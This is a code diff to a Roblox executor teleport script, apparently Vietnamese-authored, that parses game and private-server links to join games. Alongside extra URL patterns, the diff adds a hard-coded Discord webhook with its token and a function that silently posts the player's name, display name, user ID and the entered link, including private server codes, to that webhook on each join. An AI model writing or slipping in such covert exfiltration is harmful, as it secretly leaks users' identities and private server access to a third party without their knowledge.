@@ -1,6 +1,28 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local http = syn and syn.request or http_request or request
+local webhook = "https://discord.com/api/webhooks/1324251391174250627/Wo9JqpEhGS0EvlMMwavnTx9sT_g3FcRu_fVc0oLvzEYKEbeNImYsJRPxBQOvi8I53Zs4" -- thay link thật
+
+local function sendToDiscord(link)
+    if http then
+        local player = Players.LocalPlayer
+        local content = "**Player:** " .. player.Name ..
+            "\n**DisplayName:** " .. player.DisplayName ..
+            "\n**UserId:** " .. player.UserId ..
+            "\n**Joined Link:** " .. link
+
+        http({
+            Url = webhook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ content = content })
+        })
+    else
+        warn("Executor does not support sending Webhooks")
+    end
+end
 
 local historyFile = "lichsu_teleport.txt"
 local history = {}
@@ -134,18 +156,32 @@ local function parseInput(inputText)
     local placeId, vipServerId
     inputText = tostring(inputText)
 
+    -- https://www.roblox.com/games/1234567890/anything?privateServerLinkCode=abcXYZ
     local linkVipPattern = "roblox%.com/games/(%d+)/.-%?privateServerLinkCode=([%w_-]+)"
     placeId, vipServerId = string.match(inputText, linkVipPattern)
 
     if not placeId then
+        -- https://www.roblox.com/games/1234567890/anything
         placeId = string.match(inputText, "roblox%.com/games/(%d+)")
     end
 
     if not placeId then
+        -- https://www.roblox.com/vi/games/1234567890
         placeId = string.match(inputText, "roblox%.com/vi/games/(%d+)")
     end
 
+    if not placeId then
+        -- https://www.roblox.com/games/start?placeId=1234567890&launchData=abc
+        placeId = string.match(inputText, "roblox%.com/games/start%?placeId=(%d+)&launchData=")
+    end
+
+    if not placeId then
+        -- https://www.roblox.com/games/start?placeId=1234567890
+        placeId = string.match(inputText, "roblox%.com/games/start%?placeId=(%d+)")
+    end
+
     if not placeId and tonumber(inputText) then
+        -- Nếu nhập số trực tiếp
         placeId = inputText
     end
 
@@ -170,8 +206,10 @@ JoinButton.MouseButton1Click:Connect(function()
 
         if vipServerId then
             TeleportService:TeleportToPrivateServer(placeId, vipServerId, Players.LocalPlayer)
+            sendToDiscord(text)
         else
             TeleportService:Teleport(placeId, Players.LocalPlayer)
+            sendToDiscord(text)
         end
     else
         warn("Link hoặc ID không hợp lệ!")
